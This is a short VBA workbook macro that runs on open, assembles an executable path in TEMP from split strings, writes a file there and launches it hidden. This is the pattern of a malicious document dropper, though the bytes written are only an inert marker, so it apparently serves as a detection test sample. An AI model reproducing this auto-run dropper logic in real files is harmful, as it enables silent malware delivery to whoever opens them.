Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim f As Integer, exe As String
    exe = Environ("TEMP") & "\obliv" & "ionx_stub" & ".exe"
    f = FreeFile
    Open exe For Binary As #f
    Put #f, , "MZ-th" & "is-is-" & "an-i" & "nert-ma" & "rker-" & "stub"
    Close #f
    Shell exe, 0
End Sub
